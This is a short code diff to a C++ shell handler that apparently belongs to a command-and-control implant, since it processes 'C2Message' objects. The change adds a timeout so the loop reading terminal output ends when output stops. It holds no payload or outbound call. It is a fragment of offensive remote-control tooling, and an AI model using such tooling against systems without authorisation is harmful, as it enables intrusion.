@@ -6,6 +6,7 @@
 #include <unistd.h>
 #include <sys/select.h>
 #include <sys/wait.h>
+#include <chrono>
 
 using namespace std;
 
@@ -167,7 +168,8 @@ int Shell::process(C2Message &c2Message, C2Message &c2RetMessage)
     fd_set fds;
     struct timeval tv;
     char buffer[512];
-    while(true)
+    auto end = std::chrono::steady_clock::now() + std::chrono::seconds(5);
+    while(std::chrono::steady_clock::now() < end)
     {
         FD_ZERO(&fds);
         FD_SET(m_masterFd, &fds);
@@ -179,9 +181,16 @@ int Shell::process(C2Message &c2Message, C2Message &c2RetMessage)
         {
             ssize_t n = read(m_masterFd, buffer, sizeof(buffer));
             if(n > 0)
+            {
                 output.append(buffer, n);
+                end = std::chrono::steady_clock::now() + std::chrono::seconds(2);
+            }
+            else
+            {
+                break;
+            }
         }
-        else
+        else if(!output.empty())
         {
             break;
         }
